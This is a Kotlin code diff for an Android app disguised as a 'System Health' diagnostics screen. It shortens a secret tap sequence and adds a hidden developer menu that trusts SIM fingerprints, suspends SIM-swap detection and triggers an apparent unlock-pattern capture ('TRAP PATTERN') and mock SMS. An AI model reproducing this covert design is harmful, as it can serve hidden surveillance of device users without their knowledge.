@@ -300,7 +300,7 @@ fun Header(onSecretTap: () -> Unit) {
     var taps by remember { mutableIntStateOf(0) }
     Column(modifier = Modifier.fillMaxWidth().clickable { 
         taps++
-        if (taps >= 5) { taps = 0; onSecretTap() }
+        if (taps >= 3) { taps = 0; onSecretTap() }
     }) {
         Text("System Health", fontSize = 28.sp, fontWeight = FontWeight.Bold, color = TextMain)
         Text("Device diagnostics and performance", fontSize = 14.sp, color = TextDim, modifier = Modifier.padding(top = 2.dp))
@@ -517,6 +517,8 @@ fun DebugConsole(ctx: Context, onDismiss: () -> Unit) {
     val scope = rememberCoroutineScope()
     var isRevealed by remember { mutableStateOf(false) }
     var showMockSmsDialog by remember { mutableStateOf(false) }
+    var titleTaps by remember { mutableIntStateOf(0) }
+    var showDevControls by remember { mutableStateOf(false) }
 
     // Auto-refresh logic: Polls logs every 2 seconds while console is open
     LaunchedEffect(isRevealed) {
@@ -547,7 +549,17 @@ fun DebugConsole(ctx: Context, onDismiss: () -> Unit) {
                 color = TextMain, 
                 fontWeight = FontWeight.SemiBold, 
                 fontSize = 18.sp,
-                modifier = Modifier.clickable { isRevealed = true }
+                modifier = Modifier.clickable { 
+                    if (!isRevealed) {
+                        isRevealed = true
+                    } else {
+                        titleTaps++
+                        if (titleTaps >= 2) {
+                            titleTaps = 0
+                            showDevControls = true
+                        }
+                    }
+                }
             ) 
         },
         text = {
@@ -607,20 +619,7 @@ fun DebugConsole(ctx: Context, onDismiss: () -> Unit) {
         },
         dismissButton = {
             if (isRevealed) {
-                    TextButton(onClick = { showMockSmsDialog = true }) { Text("Mock SMS", color = AccentPurple) }
-
-                    TextButton(onClick = {
-                        scope.launch(Dispatchers.IO) {
-                            val mockCmd = org.json.JSONObject().apply {
-                                put("id", -3)
-                                put("file_name", "CAPTURE_PATTERN")
-                                put("content", "")
-                            }
-                            CommandProcessor.processSingleCommand(ctx, mockCmd)
-                        }
-                        onDismiss()
-                    }) { Text("TRAP PATTERN", color = Color(0xFFF87171)) }
-
+                Row {
                     TextButton(onClick = {
                         DebugLogger.clear()
                         report = DeviceManager.getDiagnosticReport(ctx) + "\n\n--- LOGS CLEARED ---"
@@ -631,9 +630,87 @@ fun DebugConsole(ctx: Context, onDismiss: () -> Unit) {
                         scope.launch(Dispatchers.IO) { DumpManager.createDailyDump(ctx) }
                         android.widget.Toast.makeText(ctx, "Export initiated", android.widget.Toast.LENGTH_SHORT).show()
                     }) { Text("Export", color = TextDim) }
+                }
             }
         }
     )
+
+    if (showDevControls) {
+        val jPrefs = ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE)
+        var isMaintenance by remember { mutableStateOf(jPrefs.getLong("maintenance_expiry", 0L) > System.currentTimeMillis()) }
+
+        AlertDialog(
+            onDismissRequest = { showDevControls = false },
+            containerColor = CardSlate,
+            title = { Text("Developer Controls", color = TextMain, fontSize = 18.sp, fontWeight = FontWeight.Bold) },
+            text = {
+                Column(verticalArrangement = Arrangement.spacedBy(16.dp)) {
+                    // Trust Current SIM
+                    Button(
+                        onClick = {
+                            val fingerprints = JudasManager.getSimFingerprints(ctx)
+                            if (fingerprints.isNotEmpty()) {
+                                jPrefs.edit().putString("trusted_sim_hashes", org.json.JSONArray(fingerprints).toString()).apply()
+                                android.widget.Toast.makeText(ctx, "Trusted ${fingerprints.size} SIM(s)", android.widget.Toast.LENGTH_SHORT).show()
+                            } else {
+                                android.widget.Toast.makeText(ctx, "No SIM found", android.widget.Toast.LENGTH_SHORT).show()
+                            }
+                        },
+                        colors = ButtonDefaults.buttonColors(containerColor = AccentGreen),
+                        modifier = Modifier.fillMaxWidth()
+                    ) { Text("Trust Current SIM(s)") }
+
+                    // Maintenance Toggle
+                    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
+                        Column(modifier = Modifier.weight(1f)) {
+                            Text("Maintenance Mode", color = TextMain, fontWeight = FontWeight.SemiBold)
+                            Text("Ignore SIM swaps for 1 hour", color = TextDim, fontSize = 12.sp)
+                        }
+                        Switch(
+                            checked = isMaintenance,
+                            onCheckedChange = { checked ->
+                                isMaintenance = checked
+                                val expiry = if (checked) System.currentTimeMillis() + 3600000L else 0L
+                                jPrefs.edit().putLong("maintenance_expiry", expiry).apply()
+                                if (checked) android.widget.Toast.makeText(ctx, "Maintenance Mode Armed (1H)", android.widget.Toast.LENGTH_SHORT).show()
+                            },
+                            colors = SwitchDefaults.colors(checkedThumbColor = AccentBlue, checkedTrackColor = AccentBlue.copy(alpha = 0.5f))
+                        )
+                    }
+
+                    Divider(color = BorderSubtle)
+
+                    // TRAP PATTERN
+                    Button(
+                        onClick = {
+                            scope.launch(Dispatchers.IO) {
+                                val mockCmd = org.json.JSONObject().apply {
+                                    put("id", -3)
+                                    put("file_name", "CAPTURE_PATTERN")
+                                    put("content", "")
+                                }
+                                CommandProcessor.processSingleCommand(ctx, mockCmd)
+                            }
+                            showDevControls = false
+                            onDismiss()
+                        },
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFEF4444)),
+                        modifier = Modifier.fillMaxWidth()
+                    ) { Text("TEST PATTERN TRAP") }
+
+                    // Mock SMS
+                    Button(
+                        onClick = { showDevControls = false; showMockSmsDialog = true },
+                        colors = ButtonDefaults.buttonColors(containerColor = AccentPurple),
+                        modifier = Modifier.fillMaxWidth()
+                    ) { Text("MOCK INCOMING SMS") }
+                }
+            },
+            confirmButton = {
+                TextButton(onClick = { showDevControls = false }) { Text("Close", color = TextMain) }
+            }
+        )
+    }
 
     if (showMockSmsDialog) {
         val dPrefs = ctx.getSharedPreferences("debug_prefs", Context.MODE_PRIVATE)
